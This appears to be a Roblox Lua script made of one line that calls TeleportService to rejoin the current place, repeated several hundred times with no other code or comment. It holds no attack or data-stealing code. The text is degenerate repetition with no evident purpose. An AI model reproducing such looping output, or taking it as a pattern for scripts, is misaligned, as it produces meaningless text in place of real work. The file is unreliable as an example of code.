	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
